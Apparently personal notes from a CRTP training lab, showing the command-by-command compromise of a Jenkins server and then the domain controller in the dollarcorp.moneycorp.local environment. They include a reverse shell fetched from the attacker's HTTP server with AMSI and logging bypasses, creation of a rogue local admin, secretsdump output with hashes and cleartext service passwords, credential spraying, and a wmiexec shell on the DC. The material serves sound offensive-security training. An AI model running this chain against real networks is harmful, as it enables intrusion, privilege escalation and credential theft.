- CI points us towards DevOps. Check for specific automation tools such as Jenkins, Alfred, etc.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# nmap -p 80,8080 172.16.3.11 -v
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 09:04 EEST
Initiating Ping Scan at 09:04
Scanning 172.16.3.11 [4 ports]
Completed Ping Scan at 09:04, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:04
Completed Parallel DNS resolution of 1 host. at 09:04, 0.01s elapsed
Initiating SYN Stealth Scan at 09:04
Scanning 172.16.3.11 [2 ports]
Discovered open port 8080/tcp on 172.16.3.11
Completed SYN Stealth Scan at 09:04, 0.20s elapsed (2 total ports)
Nmap scan report for 172.16.3.11
Host is up (0.078s latency).

PORT     STATE  SERVICE
80/tcp   closed http
8080/tcp open   http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
           Raw packets sent: 6 (240B) | Rcvd: 4 (152B)
```

- Check port 8080.
![[poc_00000.png]]
![[poc_00005.png]]
- Try username as password.
![[poc_00002.png]]
- Get a reverse shell.
![[poc_00003.png]]

```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# python3 -m http.server 80                                                                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.3.11 - - [07/Aug/2023 09:50:58] "GET /sbloggingbypass.txt HTTP/1.1" 200 -
172.16.3.11 - - [07/Aug/2023 09:50:58] "GET /amsibypass.txt HTTP/1.1" 200 -
172.16.3.11 - - [07/Aug/2023 09:50:59] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [172.16.99.3] from (UNKNOWN) [172.16.3.11] 50332
Windows PowerShell running as user ciadmin on DCORP-CI
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins\workspace\Project14>whoami
dcorp\ciadmin
PS C:\Users\Administrator\.jenkins\workspace\Project14> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
PS C:\Users\Administrator\.jenkins\workspace\Project14>
```

- Add a new local administrator to dump credentials.
```
PS C:\Users\Administrator\.jenkins\workspace\Project14> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
dcorp\ciadmin
dcorp\Domain Admins
The command completed successfully.

PS C:\Users\Administrator\.jenkins\workspace\Project14> net user admin2 'Password123!' /add
The command completed successfully.

PS C:\Users\Administrator\.jenkins\workspace\Project14> net localgroup Administrators admin2 /add
The command completed successfully.

PS C:\Users\Administrator\.jenkins\workspace\Project14>
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]                                                         
└─# impacket-secretsdump dcorp-ci/admin2:'Password123!'@172.16.3.11
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation


[*] Service RemoteRegistry is in stopped state             
[*] Starting service RemoteRegistry                      
[*] Target system bootKey: 0x84a2c88240cfb23e0c587b1f220ee26e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:deaa870c264c682aa1fbfc31ebe678a2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin2:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Dumping cached domain logon information (domain/username:hash)
DOLLARCORP.MONEYCORP.LOCAL/ciadmin:$DCC2$10240#ciadmin#3999881514643dbc5cd4efcdce983215

<snip>

[*] _SC_jenkins
dcorp\ciadmin:*ContinuousIntrusion123
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

- Checking access rights for `dcorp\ciadmin`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# crackmapexec smb dollarcorp.moneycorp.local_live_hosts.lst -u ciadmin -p '*ContinuousIntrusion123'
SMB         172.16.4.217    445    DCORP-APPSRV     [*] Windows 10.0 Build 20348 x64 (name:DCORP-APPSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.11     445    DCORP-CI         [*] Windows 10.0 Build 20348 x64 (name:DCORP-CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [*] Windows 10.0 Build 20348 x64 (name:DCORP-ADMINSRV) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.44     445    DCORP-MGMT       [*] Windows 10.0 Build 20348 x64 (name:DCORP-MGMT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.3.81     445    DCORP-SQL1       [*] Windows 10.0 Build 20348 x64 (name:DCORP-SQL1) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.4.217    445    DCORP-APPSRV     [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 
SMB         172.16.4.217    445    DCORP-APPSRV     Node CIADMIN@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
SMB         172.16.3.11     445    DCORP-CI         [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 (🩸Blooded!🩸)
SMB         172.16.4.101    445    DCORP-ADMINSRV   [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 
SMB         172.16.4.44     445    DCORP-MGMT       [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 (🩸Blooded!🩸)
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123 
SMB         172.16.3.81     445    DCORP-SQL1       [+] dollarcorp.moneycorp.local\ciadmin:*ContinuousIntrusion123
```

- Dump credentials from `DCORP-MGMT` where `dcorp\ciadmin` is a local administrator.
```
──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# impacket-secretsdump dollarcorp.moneycorp.local/ciadmin:'*ContinuousIntrusion123'@172.16.4.44                                                 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x6ccf075765eb06dec2c85646e11ac0e5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cda7ba90f97db93107a190469cd3201b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DOLLARCORP.MONEYCORP.LOCAL/svcadmin:$DCC2$10240#svcadmin#80dcb7982483a2ee1aaa9ef2da703179
DOLLARCORP.MONEYCORP.LOCAL/mgmtadmin:$DCC2$10240#mgmtadmin#b51b86694af5c690d2ad019fbfc00707
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
dcorp\DCORP-MGMT$:aes256-cts-hmac-sha1-96:b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
dcorp\DCORP-MGMT$:aes128-cts-hmac-sha1-96:0049f234ae46eba0bfb2ced5b8c8d2b4
dcorp\DCORP-MGMT$:des-cbc-md5:a79234f220c4549e
dcorp\DCORP-MGMT$:plain_password_hex:34003f0050006800430068004b005000280060003f00790057006000450038003d0056004d00320051004900310033004f00210069002a00330051003f005700560042002200580029003d003e0049006c0033003d00410063007a004a0030005e005400210058005d00720026003a002600790047003400310060002a002f0024005e0034002b00450065005a00300037003f007a00460032005a00330060003a005b004a0064002a0046002f007a005f00500060007000360042003900580048005e00670024002a006d005800490051004d00580059002800530063003f0033005c00410036004900430072005800
dcorp\DCORP-MGMT$:aad3b435b51404eeaad3b435b51404ee:0878da540f45b31b974f73312c18e754:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb3084493f6af9cf8b2964ee53accccd428737b2c
dpapi_userkey:0xe46d070e975b2473e749e7927a64a61fe1575b20
[*] NL$KM 
 0000   09 C8 7B C2 96 41 6E CB  B2 F6 1B DC 29 5C 39 76   ..{..An.....)\9v
 0010   7E A6 22 97 DC D3 BE 6B  C3 71 48 71 61 6B B2 B3   ~."....k.qHqak..
 0020   D0 D6 E0 48 F0 8B 7D 8B  8B 14 95 05 B4 21 FE 93   ...H..}......!..
 0030   28 51 47 F1 26 24 B5 F4  E4 20 B6 AC E5 90 33 02   (QG.&$... ....3.
NL$KM:09c87bc296416ecbb2f61bdc295c39767ea62297dcd3be6bc3714871616bb2b3d0d6e048f08b7d8b8b149505b421fe93285147f12624b5f4e420b6ace5903302
[*] _SC_MSSQLSERVER 
dcorp\svcadmin:*ThisisBlasphemyThisisMadness!!
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

- svcadmin is a domain administrator
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# impacket-wmiexec dollarcorp.moneycorp.local/svcadmin:'*ThisisBlasphemyThisisMadness!!'@172.16.2.1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
dcorp\svcadmin

C:\>hostname
dcorp-dc

C:\>
```